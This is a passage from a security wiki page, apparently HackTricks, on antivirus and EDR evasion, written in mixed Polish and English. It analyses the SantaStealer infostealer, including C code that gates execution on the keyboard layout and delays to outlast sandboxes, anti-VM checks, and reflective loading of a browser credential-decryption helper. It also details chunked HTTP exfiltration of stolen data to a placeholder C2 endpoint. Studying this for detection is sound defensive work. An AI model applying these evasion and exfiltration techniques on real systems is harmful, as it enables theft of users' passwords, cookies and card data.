- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer — techniki dla bezplikowego omijania wykrywania i kradzieży poświadczeń

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Variant A przegląda process list, hashuje każdą nazwę za pomocą własnego rolling checksum i porównuje ją z osadzonymi blocklists dla debuggers/sandboxes; powtarza checksum dla computer name i sprawdza working directories takie jak `C:\analysis`.
- Variant B bada właściwości systemu (process-count floor, recent uptime), wywołuje `OpenServiceA("VBoxGuest")` aby wykryć VirtualBox additions, oraz wykonuje timing checks wokół sleepów żeby wyłapać single-stepping. Każde trafienie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + double ChaCha20 reflective loading

- Główny DLL/EXE osadza Chromium credential helper, który jest albo dropped to disk, albo manually mapped in-memory; fileless mode sam rozwiązuje imports/relocations, więc żadne helper artifacts nie są zapisywane.
- Ten helper przechowuje second-stage DLL zaszyfrowany dwukrotnie ChaCha20 (dwa 32-byte keys + 12-byte nonces). Po obu przebiegach reflectively loads blob (bez `LoadLibrary`) i wywołuje exporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z ChromElevator.
- Routines z ChromElevator używają direct-syscall reflective process hollowing, aby wstrzyknąć się do żywego Chromium browser, odziedziczyć AppBound Encryption keys i odszyfrować passwords/cookies/credit cards bezpośrednio z SQLite databases pomimo ABE hardening.

### Modułowy in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iteruje global `memory_generators` function-pointer table i tworzy jeden thread na włączony moduł (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Każdy thread zapisuje wyniki do shared buffers i raportuje liczbę plików po ~45s okienku join.
- Po zakończeniu wszystko jest spakowane za pomocą statycznie linked `miniz` library jako `%TEMP%\\Log.zip`. `ThreadPayload1` następnie śpi 15s i streamuje archiwum w chunkach po 10 MB via HTTP POST do `http://<C2>:6767/upload`, spoofując browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Każdy chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcjonalnie `w: <campaign_tag>`, a ostatni chunk dopina `complete: true`, żeby C2 wiedział, że reassembly jest zakończony.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
